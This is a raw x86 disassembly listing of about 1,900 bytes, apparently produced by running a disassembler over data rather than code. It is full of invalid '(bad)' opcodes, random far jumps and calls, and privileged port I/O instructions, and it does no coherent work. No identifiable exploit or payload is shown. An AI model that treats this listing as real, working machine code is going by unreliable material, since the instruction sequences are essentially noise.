  422475:	xor    al,0xe8
  422477:	and    dh,BYTE PTR [ecx+eiz*1]
  42247a:	loop   0x422407
  42247c:	cs mov ?,eax
  42247f:	or     BYTE PTR [ecx+0x35],dl
  422482:	jmp    0xda79fd53
  422487:	dec    ebx
  422488:	dec    edx
  422489:	mov    ds:0xfe8daee1,al
  42248e:	call   0xe64b1e57
  422493:	xor    BYTE PTR [edi-0x41eda0aa],bl
  422499:	inc    ebp
  42249a:	mov    ds:0xcc5c1db0,al
  42249f:	mov    esi,0x752f68d4
  4224a4:	jecxz  0x422492
  4224a6:	inc    ebx
  4224a7:	mov    edx,0xa7d40eee
  4224ac:	mov    ebx,0x91e02f29
  4224b1:	sahf   
  4224b2:	test   ch,dh
  4224b4:	jns    0x4224a9
  4224b6:	mov    al,ds:0x8624927f
  4224bb:	icebp  
  4224bc:	mov    ch,0xde
  4224be:	jns    0x422490
  4224c0:	mov    al,ds:0x96b2621a
  4224c5:	pop    esp
  4224c6:	dec    eax
  4224c7:	lods   eax,DWORD PTR ds:[esi]
  4224c8:	adc    cx,WORD PTR [ebx]
  4224cb:	jb     0x42245f
  4224cd:	stc    
  4224ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224cf:	mov    edx,0x933b26eb
  4224d4:	inc    ecx
  4224d5:	jecxz  0x4224d0
  4224d7:	push   cs
  4224d8:	jno    0x422547
  4224da:	mov    ebx,0xfcd6af02
  4224df:	cld    
  4224e0:	loop   0x422469
  4224e2:	and    BYTE PTR [ebp-0x34de2a89],dh
  4224e8:	shr    DWORD PTR fs:[edx],0x3b
  4224ec:	inc    ebp
  4224ed:	jns    0x4224c2
  4224ef:	jne    0x422478
  4224f1:	jg     0x4224da
  4224f3:	mov    bl,0xa1
  4224f5:	sti    
  4224f6:	and    eax,0x30271eb8
  4224fb:	mov    ds:0xe005c18f,eax
  422500:	jg     0x42251a
  422502:	mov    ebx,0x727a2e20
  422507:	mov    al,ds:0x389f9745
  42250c:	stos   DWORD PTR es:[edi],eax
  42250d:	add    eax,0xa8c72045
  422512:	xchg   esp,eax
  422513:	inc    ebp
  422514:	cmp    al,0x70
  422516:	jnp    0x422589
  422518:	cmp    DWORD PTR [edi+0x5899da76],ebp
  42251e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42251f:	daa    
  422520:	scas   al,BYTE PTR es:[edi]
  422521:	mov    esi,ss
  422523:	aad    0xfd
  422525:	outs   dx,BYTE PTR ds:[esi]
  422526:	jns    0x422522
  422528:	push   esp
  422529:	dec    esp
  42252a:	(bad)  
  42252b:	les    edx,FWORD PTR [edx-0x29de5a73]
  422531:	lods   al,BYTE PTR ds:[esi]
  422532:	pop    esp
  422533:	pop    ds
  422534:	or     al,0x67
  422536:	pushf  
  422537:	out    0x74,eax
  422539:	or     DWORD PTR gs:[ebx-0x64],eax
  42253d:	shl    BYTE PTR [ecx],0x6e
  422540:	jno    0x4224c8
  422542:	cmp    bl,BYTE PTR [ebp-0xfb55f8b]
  422548:	sahf   
  422549:	aas    
  42254a:	out    dx,eax
  42254b:	leave  
  42254c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42254d:	fild   WORD PTR [ecx+0x27]
  422550:	(bad)  
  422551:	call   0xfa52a3ea
  422556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422557:	fs dec ebp
  422559:	into   
  42255a:	mov    ah,0x1
  42255c:	sub    eax,0x3c1aae94
  422561:	(bad)  
  422562:	mov    dh,0x94
  422564:	ins    BYTE PTR es:[edi],dx
  422565:	jb     0x422554
  422567:	ret    0x6214
  42256a:	je     0x422542
  42256c:	jge    0x4225b0
  42256e:	mov    dl,0xc5
  422570:	icebp  
  422571:	jecxz  0x42257b
  422573:	in     al,0x17
  422575:	(bad)  
  422576:	pusha  
  422577:	mov    ds:0x9332f12a,eax
  42257c:	push   dx
  42257e:	rol    bl,0xc9
  422581:	jp     0x4225b3
  422583:	mov    cs,WORD PTR [edi-0x57365523]
  422589:	pop    ebp
  42258a:	mov    esi,0x1be55040
  42258f:	fmulp  st(7),st
  422591:	in     al,0x40
  422593:	pop    ebx
  422594:	sbb    DWORD PTR [esi-0x67aa4589],ebp
  42259a:	cmp    BYTE PTR [eax+0x5c5faecf],bh
  4225a0:	dec    ecx
  4225a1:	sahf   
  4225a2:	dec    edx
  4225a3:	jns    0x422530
  4225a5:	gs xchg ebp,eax
  4225a7:	mov    esi,0xe8b8524b
  4225ac:	leave  
  4225ad:	xchg   ebx,eax
  4225ae:	pop    es
  4225af:	cs jmp 0xade4:0xae754206
  4225b7:	lock fisub WORD PTR [esi-0x55]
  4225bb:	and    ah,BYTE PTR fs:[eax-0x3ef69156]
  4225c2:	ret    
  4225c3:	mov    eax,ds:0x59a0d810
  4225c8:	jns    0x4225b8
  4225ca:	lds    esp,FWORD PTR [esi-0x15]
  4225cd:	gs jne 0x4225b4
  4225d0:	mov    ebx,0x6d24fd1f
  4225d5:	imul   esp,DWORD PTR [ebp+esi*8+0x6e],0xffffffc8
  4225da:	mov    bh,BYTE PTR [eax]
  4225dc:	fs daa 
  4225de:	cmc    
  4225df:	inc    esp
  4225e0:	adc    eax,0x7821a632
  4225e5:	jae    0x422664
  4225e7:	xchg   esi,eax
  4225e8:	adc    ebp,eax
  4225ea:	in     eax,dx
  4225eb:	adc    BYTE PTR [ebx],ah
  4225ed:	jo     0x422577
  4225ef:	repz push edi
  4225f1:	aad    0x23
  4225f3:	inc    ebp
  4225f4:	sub    DWORD PTR [ebx-0x33],ebx
  4225f7:	add    eax,0x967d96f9
  4225fc:	mov    bl,0xd6
  4225fe:	pop    ds
  4225ff:	mov    ds:0x57b4a6bf,al
  422604:	scas   eax,DWORD PTR es:[edi]
  422605:	xor    bh,ch
  422607:	mov    eax,0x116015bc
  42260c:	rcl    edi,1
  42260e:	not    DWORD PTR [edi+0x7]
  422611:	cmp    esi,eax
  422613:	bound  esi,QWORD PTR [eax+0x6e645d3d]
  422619:	ret    
  42261a:	or     al,ah
  42261c:	nop
  42261d:	jno    0x4225a8
  42261f:	call   0xa5f8:0x24f2c2e7
  422626:	and    dh,dh
  422628:	xor    ah,BYTE PTR [esi+0x43]
  42262b:	sbb    edi,DWORD PTR [eax]
  42262d:	dec    esi
  42262e:	fst    st(5)
  422630:	inc    edi
  422631:	sbb    DWORD PTR [eax-0x68],ecx
  422634:	cmp    eax,0x92ffb677
  422639:	dec    ecx
  42263a:	jns    0x4226b3
  42263c:	jbe    0x42268b
  42263e:	imul   edx,esi,0x4a
  422641:	aam    0xe5
  422643:	in     eax,dx
  422644:	or     al,0xf0
  422646:	jmp    0x422664
  422648:	(bad)  
  422649:	jbe    0x4225df
  42264b:	out    0xa0,al
  42264d:	test   eax,0xe78e42b1
  422652:	repnz cwde 
  422654:	mov    esi,0x74cc76df
  422659:	das    
  42265a:	and    al,0x83
  42265c:	adc    eax,0x2f12f0f8
  422661:	mov    edx,0xc2941051
  422666:	setb   ah
  422669:	lea    eax,[ebp-0x4b]
  42266c:	inc    esi
  42266d:	ja     0x4226cc
  42266f:	int    0x52
  422671:	cs pop edi
  422673:	xlat   BYTE PTR ds:[ebx]
  422674:	push   ss
  422675:	mov    ah,0x46
  422677:	aad    0x55
  422679:	dec    ebx
  42267a:	lds    ebx,FWORD PTR [eax-0x6965c77f]
  422680:	fld    TBYTE PTR [ecx]
  422682:	fwait
  422683:	imul   esp,ebx,0x9adb3605
  422689:	je     0x4226cc
  42268b:	lea    ecx,[eax]
  42268d:	push   edx
  42268e:	enter  0x9985,0x90
  422692:	pushf  
  422693:	push   cs
  422694:	addr16 mov ebx,0x9145b9b8
  42269a:	cmc    
  42269b:	or     al,0xac
  42269d:	test   BYTE PTR [eax+0xc],dl
  4226a0:	repnz inc eax
  4226a2:	(bad)  
  4226a3:	icebp  
  4226a4:	inc    ebx
  4226a5:	mov    ebx,0xf16b98d7
  4226aa:	adc    al,BYTE PTR [ecx-0xf972b72]
  4226b0:	gs shl DWORD PTR cs:[edx],cl
  4226b4:	call   0xf52a:0xd5c1acff
  4226bb:	enter  0xf1a3,0x24
  4226bf:	out    0xd5,eax
  4226c1:	adc    esp,DWORD PTR [ecx+0x4717309d]
  4226c7:	js     0x4226bd
  4226c9:	ss (bad) 
  4226cb:	and    al,0xe2
  4226cd:	in     al,0xe9
  4226cf:	or     al,al
  4226d1:	push   ebp
  4226d2:	daa    
  4226d3:	imul   esi,DWORD PTR [eax-0x42],0xc995244
  4226da:	add    eax,0xb043fe9
  4226df:	dec    edi
  4226e0:	fwait
  4226e1:	cmp    BYTE PTR [esi-0x6f30ac5a],dh
  4226e7:	cmp    BYTE PTR [edi+0x2e],ch
  4226ea:	fmul   QWORD PTR [eax-0x5a126bfa]
  4226f0:	cli    
  4226f1:	les    esi,FWORD PTR [edx]
  4226f3:	xlat   BYTE PTR ds:[ebx]
  4226f4:	adc    eax,0x3f433f69
  4226f9:	push   ebp
  4226fa:	popa   
  4226fb:	arpl   WORD PTR [edx+edi*1+0x63e16cd4],sp
  422702:	jl     0x4226bc
  422704:	mov    ds:0xf0df5ae7,eax
  422709:	loop   0x42270a
  42270b:	xlat   BYTE PTR ds:[ebx]
  42270c:	xchg   DWORD PTR [esi-0x7a2f3969],esi
  422712:	mov    esi,0xc87ef30d
  422717:	retf   
  422718:	cld    
  422719:	xchg   ebx,eax
  42271a:	je     0x422731
  42271c:	mov    ah,0x28
  42271e:	sub    eax,DWORD PTR [ecx+0x53]
  422721:	out    dx,al
  422722:	mov    bh,0x98
  422724:	mov    ds:0xb98c3dc0,al
  422729:	mov    bh,0x47
  42272b:	jmp    0x834b:0x4ed3c4e
  422732:	mov    edx,0xb5a9c619
  422737:	ret    
  422738:	pusha  
  422739:	mov    ebp,0x4b87cae5
  42273e:	fnstsw WORD PTR ds:0x3ba10a8a
  422744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422745:	pop    esi
  422746:	call   0x2909:0xa2d8cee3
  42274d:	mov    WORD PTR [edi-0x2287f5b8],?
  422753:	add    edi,DWORD PTR [ebx+ebx*2]
  422756:	cld    
  422757:	xor    edi,DWORD PTR [ecx]
  422759:	mov    ebp,0x324b0f06
  42275e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42275f:	inc    esp
  422760:	sar    DWORD PTR [edi+0x5f],1
  422763:	or     al,0xdd
  422765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422766:	inc    ebp
  422767:	pop    esi
  422768:	(bad)  
  422769:	outs   dx,DWORD PTR ds:[esi]
  42276a:	jl     0x4227dc
  42276c:	and    BYTE PTR [eax+0x28],0x27
  422770:	rcr    ecx,cl
  422772:	adc    DWORD PTR [ecx+0x22],eax
  422775:	jmp    0x42273b
  422777:	mov    al,0x98
  422779:	outs   dx,DWORD PTR ds:[esi]
  42277a:	test   eax,0x114147c4
  42277f:	sub    edx,DWORD PTR ss:[ebp+0x33]
  422783:	mov    ebp,0x7a638958
  422788:	pop    es
  422789:	test   BYTE PTR [edx],cl
  42278b:	clc    
  42278c:	in     al,0xc8
  42278e:	je     0x4227f9
  422790:	fld    DWORD PTR [ebp-0x5abdce77]
  422796:	int3   
  422797:	not    DWORD PTR [edi-0x18a68905]
  42279d:	xchg   ecx,eax
  42279e:	lahf   
  42279f:	pop    esp
  4227a0:	mov    BYTE PTR [ecx+0x3a],ah
  4227a3:	addr16 inc esp
  4227a5:	add    eax,0x301a5153
  4227aa:	jne    0x422744
  4227ac:	xchg   edi,eax
  4227ad:	xchg   DWORD PTR [ebx],ebx
  4227af:	inc    esp
  4227b0:	pop    edx
  4227b1:	jmp    0x587d9915
  4227b6:	fmul   DWORD PTR [esi]
  4227b8:	push   edx
  4227b9:	stc    
  4227ba:	add    eax,0x7ed2e5ce
  4227bf:	in     eax,dx
  4227c0:	or     bl,BYTE PTR [ebp-0x8]
  4227c3:	add    bh,dl
  4227c5:	enter  0x2707,0xfd
  4227c9:	(bad)  
  4227ca:	out    dx,eax
  4227cb:	xchg   edi,eax
  4227cc:	fild   WORD PTR [esi]
  4227ce:	ret    0x7aee
  4227d1:	icebp  
  4227d2:	push   edi
  4227d3:	loop   0x422831
  4227d5:	adc    edi,DWORD PTR ds:0xd5f3005b
  4227db:	sbb    BYTE PTR [edi+0x33ac8fee],cl
  4227e1:	xor    edx,0xf042ba48
  4227e7:	inc    edi
  4227e8:	aas    
  4227e9:	and    dl,BYTE PTR [ecx+0x65735cea]
  4227ef:	dec    esi
  4227f0:	fwait
  4227f1:	jno    0x4227a1
  4227f3:	fcmovnu st,st(1)
  4227f5:	out    0x74,al
  4227f7:	push   ebx
  4227f8:	lods   al,BYTE PTR ds:[esi]
  4227f9:	outs   dx,DWORD PTR ds:[esi]
  4227fa:	into   
  4227fb:	enter  0xcdec,0xda
  4227ff:	jns    0x422813
  422801:	pop    ecx
  422802:	je     0x422852
  422804:	pop    ss
  422805:	or     edx,esp
  422807:	bound  ebx,QWORD PTR [esi+0x77804196]
  42280d:	sbb    edx,edi
  42280f:	int3   
  422810:	xlat   BYTE PTR ds:[ebx]
  422811:	xor    BYTE PTR [ecx-0x4eec81fa],dl
  422817:	xlat   BYTE PTR ds:[ebx]
  422818:	jmp    0x422803
  42281a:	or     ecx,esp
  42281c:	pushf  
  42281d:	int    0xf4
  42281f:	adc    al,0x89
  422821:	js     0x42289c
  422823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422824:	call   0x761a0d50
  422829:	push   0xffffff8d
  42282b:	cmp    BYTE PTR [eax+0x63],0xa9
  42282f:	stos   BYTE PTR es:[edi],al
  422830:	jne    0x422868
  422832:	push   0xe02a17a1
  422837:	xor    BYTE PTR [ebp-0x69],0x19
  42283b:	call   0xda9c1db1
  422840:	fcom   DWORD PTR [ebx]
  422842:	or     al,0x14
  422844:	mov    bh,0xbe
  422846:	push   ecx
  422847:	inc    eax
  422848:	push   cs
  422849:	pop    esi
  42284a:	fstp   DWORD PTR [ecx-0x258295a6]
  422850:	int    0x88
  422852:	push   0xfffffff8
  422854:	das    
  422855:	inc    esp
  422856:	std    
  422857:	ja     0x4228a7
  422859:	add    al,BYTE PTR [ebx-0x54]
  42285c:	sub    ebp,ebp
  42285e:	nop    ebp
  422861:	sar    BYTE PTR [ebx+eax*1+0x751d8b2f],0x27
  422869:	xchg   esp,eax
  42286a:	mov    bl,0x3
  42286c:	cmp    DWORD PTR [edi+0x2d5de153],ebp
  422872:	int    0x98
  422874:	xchg   ebp,eax
  422875:	call   0x321d9fd7
  42287a:	(bad)  
  42287c:	pusha  
  42287d:	sbb    al,0xfe
  42287f:	addr16 dec eax
  422881:	inc    esi
  422882:	jae    0x422813
  422884:	push   eax
  422885:	lods   eax,DWORD PTR ds:[esi]
  422886:	and    ah,BYTE PTR [ecx+edx*8]
  422889:	(bad)
  42288d:	pop    esp
  42288e:	mov    WORD PTR [ebp-0x52],ss
  422891:	or     DWORD PTR [edi],0xd8d64f2c
  422897:	call   0x34cb:0x244dc477
  42289e:	lock stos DWORD PTR es:[edi],eax
  4228a0:	inc    ebp
  4228a1:	out    dx,eax
  4228a2:	and    DWORD PTR [ebx],eax
  4228a4:	sbb    BYTE PTR [ebx],al
  4228a6:	ss cwde 
  4228a8:	sbb    DWORD PTR [eax],0xefd01611
  4228ae:	add    ebx,esi
  4228b0:	scas   al,BYTE PTR es:[edi]
  4228b1:	push   ecx
  4228b2:	fucomi st,st(5)
  4228b4:	loop   0x422931
  4228b6:	in     eax,0x1e
  4228b8:	xchg   al,dl
  4228ba:	lea    eax,[ebx+ecx*4+0x69496ca1]
  4228c1:	cmp    al,0xfd
  4228c3:	fisub  DWORD PTR [eax-0x6a]
  4228c6:	fsubr  st(5),st
  4228c8:	inc    edx
  4228c9:	xchg   esp,eax
  4228ca:	aas    
  4228cb:	cmp    edx,edi
  4228cd:	add    al,0x62
  4228cf:	stos   BYTE PTR es:[edi],al
  4228d0:	pop    ebx
  4228d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228d2:	jp     0x4228bc
  4228d4:	in     eax,dx
  4228d5:	in     al,0xaa
  4228d7:	pushf  
  4228d8:	cli    
  4228d9:	(bad)  
  4228da:	outs   dx,BYTE PTR ds:[esi]
  4228db:	adc    eax,0xeab96b2a
  4228e0:	inc    eax
  4228e1:	push   edi
  4228e2:	mov    ebx,0x84e7f802
  4228e7:	adc    ecx,DWORD PTR [eax-0x7b5f18e4]
  4228ed:	dec    edi
  4228ee:	jmp    0x8387:0xc55ac9fa
  4228f5:	test   eax,0x2d503e31
  4228fa:	pop    ebx
  4228fb:	push   esp
  4228fc:	cmp    DWORD PTR [eax-0x349b528f],esi
  422902:	inc    ebp
  422903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422904:	iret   
  422905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422906:	and    eax,0x53ce417a
  42290b:	sbb    DWORD PTR [ebp-0x5c36aabb],eax
  422911:	fdivr  QWORD PTR [eax+0x585591f7]
  422917:	cmp    dl,BYTE PTR [eax+0x76]
  42291a:	mov    ds:0x12615070,al
  42291f:	dec    esi
  422920:	jle    0x4228a2
  422922:	hlt    
  422923:	sbb    al,0x55
  422925:	mov    WORD PTR [ebx],ds
  422927:	mov    DWORD PTR [ecx],edx
  422929:	sub    bl,dl
  42292b:	je     0x422987
  42292d:	outs   dx,DWORD PTR ds:[esi]
  42292e:	pop    esp
  42292f:	je     0x422970
  422931:	mov    ch,0x6d
  422933:	push   ecx
  422934:	enter  0x4ba1,0x87
  422938:	cmp    cl,BYTE PTR [eax*2+0x62a05599]
  42293f:	stos   BYTE PTR es:[edi],al
  422940:	loop   0x422923
  422942:	fsub   QWORD PTR [eax-0x22]
  422945:	mov    dl,0x15
  422947:	mov    ecx,0x2391ff8e
  42294c:	outs   dx,DWORD PTR ds:[esi]
  42294d:	lods   al,BYTE PTR ds:[esi]
  42294e:	aam    0xbb
  422950:	shl    BYTE PTR [eax],cl
  422952:	and    cl,BYTE PTR [esi]
  422954:	ins    DWORD PTR es:[edi],dx
  422955:	cmp    DWORD PTR [esi-0x2842d1be],ebx
  42295b:	fistp  DWORD PTR [edx-0x41]
  42295e:	adc    eax,DWORD PTR [ebx+0x22]
  422961:	ins    DWORD PTR es:[edi],dx
  422962:	mov    ds:0x97236b6d,eax
  422967:	push   eax
  422968:	inc    esi
  422969:	int    0x70
  42296b:	add    edi,esp
  42296d:	cmpps  xmm6,XMMWORD PTR [esi+0x3e4d1c],0xf3
  422975:	or     ah,al
  422977:	push   ebp
  422978:	arpl   ax,cx
  42297a:	rol    ecx,0xef
  42297d:	jg     0x42298f
  42297f:	mov    cl,0x3b
  422981:	or     DWORD PTR [esi-0x7a],0xffffff99
  422985:	mov    ?,WORD PTR [edi]
  422987:	mov    al,ds:0xbacf197
  42298c:	push   es
  42298d:	jae    0x42296b
  42298f:	jge    0x42294b
  422991:	push   es
  422992:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422993:	in     eax,0xf9
  422995:	mov    edx,0x8d2a6981
  42299a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42299b:	daa    
  42299c:	add    al,BYTE PTR [edi]
  42299e:	jl     0x422943
  4229a0:	push   ebx
  4229a1:	cmp    ah,dl
  4229a3:	push   ebx
  4229a4:	aad    0xd
  4229a6:	jg     0x422a25
  4229a8:	in     eax,0xf1
  4229aa:	ds clc 
  4229ac:	inc    ebx
  4229ad:	jle    0x4229ad
  4229af:	xchg   ebp,eax
  4229b0:	sbb    ebx,DWORD PTR [edx+ebp*1]
  4229b3:	inc    edi
  4229b4:	add    BYTE PTR [eax],0x3c
  4229b7:	pusha  
  4229b8:	inc    edi
  4229b9:	out    dx,al
  4229ba:	into   
  4229bb:	(bad)  
  4229bc:	cmp    esi,DWORD PTR [ebx+edi*4]
  4229bf:	sub    bh,BYTE PTR [ecx-0x712bfdc6]
  4229c5:	int    0x8b
  4229c7:	jo     0x422a32
  4229c9:	xchg   DWORD PTR [edx+eax*8+0x70],ebp
  4229cd:	dec    esi
  4229ce:	stc    
  4229cf:	mov    bl,0x4e
  4229d1:	mov    BYTE PTR [ebx-0x49],dl
  4229d4:	mov    edx,?
  4229d6:	cmp    ah,BYTE PTR [edx+0x46afeca5]
  4229dc:	add    ch,BYTE PTR [edi+edx*8+0x4]
  4229e0:	sbb    ebx,eax
  4229e2:	mov    eax,0x702f8c5d
  4229e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229e8:	jmp    0xc19:0xbb9f70dc
  4229ef:	les    ebp,FWORD PTR [esi+eiz*4]
  4229f2:	ja     0x422981
  4229f4:	sub    eax,DWORD PTR [edi]
  4229f6:	mov    dl,0x9d
  4229f8:	jae    0x422987
  4229fa:	adc    al,0xf
  4229fc:	out    dx,eax
  4229fd:	push   edi
  4229fe:	xchg   edi,eax
  4229ff:	scas   eax,DWORD PTR es:[edi]
  422a00:	adc    DWORD PTR ds:0x257b7171,ebp
  422a06:	mov    esi,0x1cd8532e
  422a0b:	mov    cl,0xce
  422a0d:	das    
  422a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a0f:	xchg   edi,eax
  422a10:	xchg   esi,eax
  422a11:	sbb    eax,0xa7cb6a16
  422a16:	cdq    
  422a17:	jge    0x422a4c
  422a19:	ret    0xbf85
  422a1c:	sti    
  422a1d:	ret    
  422a1e:	fnstcw WORD PTR [esi-0x78]
  422a21:	sbb    al,0x83
  422a23:	sti    
  422a24:	test   DWORD PTR [ebx-0x94420a5],eax
  422a2a:	mov    bl,0xd2
  422a2c:	adc    DWORD PTR [esi-0x10a8d3f],edi
  422a32:	or     eax,0xf4155133
  422a37:	fisubr DWORD PTR [ebx-0x2932e03f]
  422a3d:	retf   0x4f68
  422a40:	push   edx
  422a41:	fcmovnbe st,st(1)
  422a43:	cmc    
  422a44:	or     ebp,DWORD PTR [edx+eax*1]
  422a47:	adc    bh,bh
  422a49:	jb     0x422ac5
  422a4b:	adc    eax,0x31af933d
  422a50:	dec    esi
  422a51:	jo     0x422a0b
  422a53:	pop    ebp
  422a54:	neg    BYTE PTR [ebx+0x21]
  422a57:	pop    edi
  422a58:	pop    ds
  422a59:	test   ebx,ebp
  422a5b:	pop    esp
  422a5c:	adc    ebp,DWORD PTR [ecx-0x9]
  422a5f:	add    eax,0x7c58dc94
  422a64:	mov    eax,DWORD PTR [eax+0x4d7a9cfd]
  422a6a:	aaa    
  422a6b:	cmp    ah,BYTE PTR [esi-0x2c]
  422a6e:	pop    ebp
  422a6f:	gs cmp dh,cl
  422a72:	dec    ebx
  422a73:	push   eax
  422a74:	je     0x422ae5
  422a76:	jbe    0x422a56
  422a78:	push   edi
  422a79:	pop    edi
  422a7a:	daa    
  422a7b:	add    BYTE PTR [edx-0x7a],0x6d
  422a7f:	inc    eax
  422a80:	pop    ebp
  422a81:	xchg   esi,eax
  422a82:	xchg   ebx,eax
  422a83:	push   es
  422a84:	out    dx,eax
  422a85:	inc    ebp
  422a86:	adc    cl,BYTE PTR [edx+0x7b281333]
  422a8c:	jle    0x422a29
  422a8e:	sti    
  422a8f:	jns    0x422a57
  422a91:	cwde   
  422a92:	clc    
  422a93:	sub    edx,DWORD PTR [ebp-0x79]
  422a96:	adc    esp,esi
  422a98:	rcl    DWORD PTR [eax],1
  422a9a:	dec    ebp
  422a9b:	shl    ebx,cl
  422a9d:	xchg   esi,eax
  422a9e:	xchg   ebp,eax
  422a9f:	pop    ebx
  422aa0:	sbb    ebx,DWORD PTR [edi-0x3898ffed]
  422aa6:	shl    BYTE PTR [eax+0x3d770db5],cl
  422aac:	sbb    eax,0x7179ec4d
  422ab1:	mov    BYTE PTR ds:0xec935aab,ch
  422ab7:	std    
  422ab8:	scas   al,BYTE PTR es:[edi]
  422ab9:	push   esp
  422aba:	mov    esi,0x347db7b1
  422abf:	scas   eax,DWORD PTR es:[edi]
  422ac0:	add    esp,DWORD PTR [ebx-0x11]
  422ac3:	loop   0x422a9f
  422ac5:	and    DWORD PTR [ecx+edi*8+0x7f79f8ec],eax
  422acc:	push   esp
  422acd:	int    0xad
  422acf:	xor    DWORD PTR [ebp+0x49],edx
  422ad2:	and    al,0x1e
  422ad4:	sahf   
  422ad5:	dec    edx
  422ad6:	cmp    bl,BYTE PTR [ebx]
  422ad8:	mov    ds:0xdd644a8d,al
  422add:	cld    
  422ade:	loope  0x422a6e
  422ae0:	or     al,0x77
  422ae2:	lock scas eax,DWORD PTR es:[edi]
  422ae4:	fcmovbe st,st(2)
  422ae6:	lods   al,BYTE PTR ds:[esi]
  422ae7:	fwait
  422ae8:	mov    ebx,0x819d6806
  422aed:	rol    bh,cl
  422aef:	pusha  
  422af0:	addr16 (bad) 
  422af2:	mov    dh,0xea
  422af4:	adc    al,0x35
  422af6:	fist   WORD PTR [edi]
  422af8:	lahf   
  422af9:	sub    DWORD PTR [edx-0x498ba279],ebx
  422aff:	aad    0xa2
  422b01:	out    dx,al
  422b02:	xor    DWORD PTR [esi+0x4a],edi
  422b05:	sbb    al,0x42
  422b07:	lods   eax,DWORD PTR ds:[esi]
  422b08:	mov    al,0xa8
  422b0a:	das    
  422b0b:	aad    0x57
  422b0d:	fisttp DWORD PTR [ebx+0x23f2f67c]
  422b13:	sub    al,0x24
  422b15:	xchg   edi,eax
  422b16:	dec    esp
  422b17:	pop    eax
  422b18:	push   ebx
  422b19:	mov    eax,es:0x300d4e7a
  422b1f:	jb     0x422b9b
  422b21:	xchg   DWORD PTR ds:0x8811e2fc,edx
  422b27:	iret   
  422b28:	dec    ecx
  422b29:	jmp    0x422b55
  422b2b:	scas   eax,DWORD PTR es:[edi]
  422b2c:	push   eax
  422b2d:	sbb    dh,al
  422b2f:	xchg   edx,eax
  422b30:	push   esp
  422b31:	std    
  422b32:	xchg   ebp,eax
  422b33:	mov    esp,0x4e871f67
  422b38:	dec    edx
  422b39:	mul    edi
  422b3b:	je     0x422b62
  422b3d:	dec    esp
  422b3e:	enter  0xab5a,0xd
  422b42:	sahf   
  422b43:	mov    BYTE PTR [ebx+0x70],ch
  422b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b47:	dec    esi
  422b48:	jmp    0xdc5:0x215bbc8f
  422b4f:	adc    BYTE PTR [edx-0x2a2b7bae],cl
  422b55:	mov    fs,WORD PTR [ecx]
  422b57:	mov    edx,0x30bf0953
  422b5c:	jno    0x422b77
  422b5e:	lds    ebx,FWORD PTR [edi-0x2ee527d5]
  422b64:	ja     0x422ba3
  422b66:	cmp    BYTE PTR [esi-0x183f563b],0xe
  422b6d:	idiv   DWORD PTR [ebx-0xace4b73]
  422b73:	sub    al,0xff
  422b75:	xor    ah,BYTE PTR [ecx+ebp*1+0x425d7231]
  422b7c:	sub    ch,BYTE PTR [ebp-0x55]
  422b7f:	xor    esp,ebx
  422b81:	int3   
  422b82:	xchg   esp,eax
  422b83:	(bad)  
  422b85:	(bad)  
  422b87:	fwait
  422b88:	int    0x67
  422b8a:	pop    esi
  422b8b:	add    al,BYTE PTR [ecx+ebx*1+0x13]
  422b8f:	addr16 inc eax
  422b91:	adc    al,0xa8
  422b93:	pop    ebp
  422b94:	cmp    esp,DWORD PTR [ecx-0x45]
  422b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b98:	std    
  422b99:	aad    0x2f
  422b9b:	sub    ch,BYTE PTR [ebp+0x5c]
  422b9e:	sub    ebp,ecx
  422ba0:	lods   al,BYTE PTR ds:[esi]
  422ba1:	jnp    0x422b76
  422ba3:	xchg   esp,eax
  422ba4:	stc    
  422ba5:	cli    
  422ba6:	xchg   ebx,eax
  422ba7:	mov    ebx,0xb4dfe764
  422bac:	jp     0x422b93
  422bae:	xor    cl,cl
  422bb0:	mov    WORD PTR ds:0x61ae2eb0,ss
  422bb6:	mov    ah,0x54
  422bb8:	les    ebx,FWORD PTR [eax]
  422bba:	nop
  422bbb:	gs dec ecx
  422bbd:	push   edi
  422bbe:	mul    BYTE PTR [edx+0x75]
  422bc1:	pop    es
  422bc2:	lods   al,BYTE PTR ds:[esi]
  422bc3:	inc    esi
  422bc4:	(bad)  
  422bc5:	mov    ecx,0x836d6f36
  422bca:	xor    esp,DWORD PTR [ecx-0x5148662c]
  422bd0:	(bad)  
  422bd2:	mov    BYTE PTR gs:[edx-0x69e2618b],cl
  422bd9:	sub    ah,BYTE PTR [eax-0x338f2e3c]
  422bdf:	test   DWORD PTR [esi],esi
  422be1:	(bad)  
  422be2:	mov    gs,ecx
  422be4:	ins    DWORD PTR es:[edi],dx
  422be5:	push   cs
  422be6:	and    BYTE PTR ds:0x15df2a6b,bl
  422bec:	pop    esp
  422bed:	mov    edx,0x3b02b1c1
  422bf2:	lods   al,BYTE PTR ds:[esi]
  422bf3:	cmc    
  422bf4:	outs   dx,BYTE PTR ds:[esi]
  422bf5:	xor    edx,eax
  422bf7:	xor    dh,BYTE PTR [ebx]
  422bf9:	push   ebx
  422bfa:	mov    bh,0x18
  422bfc:	xor    al,0x28
  422bfe:	lds    edi,FWORD PTR [ebx]
  422c00:	ja     0x422be9
  422c02:	jmp    0x5eb092dd
  422c07:	sbb    cl,BYTE PTR [ebx]
  422c09:	js     0x422c82
  422c0b:	push   ebx
  422c0c:	mov    ss,WORD PTR ds:[ebx+0x67]
  422c10:	sbb    ecx,edx
  422c12:	mov    bl,0x8
  422c14:	lods   al,BYTE PTR ds:[esi]
  422c15:	stos   DWORD PTR es:[edi],eax
  422c16:	in     eax,dx
  422c17:	ds data16 cli 
  422c1a:	mov    ah,0xe4
  422c1c:	jmp    0x77b81c93
